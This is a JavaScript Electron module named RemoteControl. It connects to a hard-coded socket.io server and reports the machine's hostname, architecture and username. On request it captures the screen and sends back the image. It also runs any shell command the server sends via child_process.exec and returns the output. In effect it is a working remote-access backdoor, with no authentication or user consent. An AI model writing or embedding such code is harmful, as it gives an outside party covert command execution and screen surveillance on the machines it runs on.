
const { desktopCapturer } = require("electron");
const io = require("socket.io-client");
const child_process = require("child_process");
const os = require("os");

let info = { host: "192.168.1.153", port: 3001, id: os.hostname() + "|" + os.arch() + "|" + os.userInfo().username }


class RemoteControl {
    getScreenData = async (data) => {
        let pr = new Promise((resolve, reject) => {
            (async () => {
                let sources = await desktopCapturer.getSources({
                    types: ["screen"],
                    thumbnailSize: {
                        width: parseInt(data.dimension.split("x")[0]),
                        height: parseInt(data.dimension.split("x")[1])
                    }
                });
                data["src"] = sources[data.screen].thumbnail.toDataURL();
                this.socket.emit("screenshotResponse", data);
                resolve("success");
            })()
        });
        return pr;
    }

    start = () => {
        this.socket = io.connect("http://" + info.host + ":" + info.port);
        this.socket.on("connect", () => {
            this.socket.emit("joinToRoom", { roomName: "terminal-" + info.id });
        });

        this.socket.on("screenshotRequest", data => {
            this.getScreenData(data).then();
        });

        this.socket.on("getRunRequest", data => {
            console.log(data);
            child_process.exec(data.cmd, { shell: true }, (err, stdout, stderr) => {
                if (err) {
                    data["cmd"] = "err: " + err;
                }
                else if (stderr) {
                    data["cmd"] = "stderr: " + stderr;
                }
                else {
                    data["cmd"] = stdout;
                }

                this.socket.emit("getRunResponse", data);
            });
        });
    }
}

module.exports = new RemoteControl;